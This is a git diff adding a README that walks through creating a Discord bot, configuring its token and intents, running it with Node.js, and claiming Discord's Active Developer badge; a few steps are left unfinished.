@@ -1,1 +1,48 @@
-# ENG-Discord-Developer-Badge
+# Hello! Today I will tell you how to get an active developer badge in the discord
+![Alt-Developer Badge](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREt6DJ1OVMmDZCze67sft2tRlgaBSR1Ifyf97F8zxUqQ&s)
+
+## Note! GitHub cannot accept more than 100 files. I have a lot of them. I did not upload them to this repository again. Click on the link (https://github.com/toptipus/activedeveloper/archive/refs/heads/main .zip) and download all the files from here.
+
+### 1. Create and configure a bot
+You need to create a reid bot by following the link (https://discord.com/developers/applications ). Click "New Applications", write the name and check the box.
+Next, we need to go to the tab in the column on the left "OAuth2"-"URL Generator". Among the buttons with ticks, we look for "bot" and poke to put a tick. Even lower in the "SELECT REDIRECT URL" window, select. Select "Administrator" below. Next, we generate a link to the bot. Click on the link and add the bot to your private discord server.
+In the column on the left, select "Bot". There we put all the sliders on and check the box next to "Administrator" below. At the very top of the page, click "Reset token". 
+
+### 2. Config.json
+Copy the token and go to the file "config.json".
+
+```json
+{
+    "token": "token",
+    "cfg": {
+        "intents": [
+            "GUILDS",
+            "GUILD_BANS",
+            "GUILD_EMOJIS_AND_STICKERS",
+            "GUILD_INTEGRATIONS",
+            "GUILD_WEBHOOKS",
+            "GUILD_INVITES",
+            "GUILD_VOICE_STATES",
+            "GUILD_MESSAGES",
+            "GUILD_MESSAGE_REACTIONS",
+            "GUILD_MESSAGE_TYPING",
+            "DIRECT_MESSAGES",
+            "DIRECT_MESSAGE_REACTIONS",
+            "DIRECT_MESSAGE_TYPING"
+        ]
+    }
+}
+```
+Instead of token, we write the token that your bot has. Remember that this token cannot be given to anyone because with the help of the token, you can control your bot.
+
+### 3. Installing NodeJS
+Without installing NodeJS, you will not succeed. Click on the link (https://nodejs.org/en/download ) and download the installer. We launch it. During installation, just click next. **Do not change the installation path!**
+
+### 4. Server Preparation
+Go to the settings of your discord server. We find the "create a community" tab there. Creating
+
+###5. Launching the bot
+In order for the bot to start working, you need to run the "start_bot.bat" file. In the console, you should have written "The name of your bot READY". Go to your server's chat and write the command "/ping". The bot will answer you "pong".
+
+###6. Getting the badge
+To get the badge, you need to follow the link (https://discord.com/developers/active-developer ) and press the button in the middle. The receiving process takes from 24 hours
